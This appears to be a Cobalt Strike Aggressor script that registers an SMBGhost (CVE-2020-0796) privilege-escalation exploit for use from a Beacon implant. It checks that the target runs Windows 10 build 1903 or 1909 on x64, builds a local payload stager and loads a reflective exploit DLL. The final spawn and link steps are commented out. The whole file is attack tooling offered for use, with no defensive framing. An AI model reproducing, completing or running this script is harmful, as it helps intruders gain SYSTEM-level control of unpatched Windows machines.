#cs4.2
sub CVE_2020_0796 {
	local('$stager');
	foreach $key => $value (binfo($1)) {
		println("$[15]key $value");
	}
	$winbuild = binfo($1, "build");
	show_message($winbuild);
	if ($winbuild != 18362 && $winbuild != 18363) {
		berror($1, "This exploit only supports Windows 10 versions 1903 - 1909");
		return;
	}
	if (!-is64 $1) {
		berror($1, "cve-2020-0796 exploit is x64 only");
		return;
	}
	btask($1, "Task Beacon to run " . listener_describe($2) . " cve-2020-0796");
	$stager = payload_local($1, $2, "x64", "thread");
	$stager = pack("I-", strlen($stager)) . $stager;
	$dll = getFileProper(script_resource("modules"), "reflective_dll.x64.dll"); 
	#bdllspawn!($1, getFileProper(script_resource("modules"), "reflective_dll.x64.dll"), $stager, "cve-2020-0796", 5000);
	#beacon_link($1, $null, $3['listener']);
}
beacon_exploit_register("CVE_2020_0796", "CVE-2020-0796", &CVE_2020_0796);
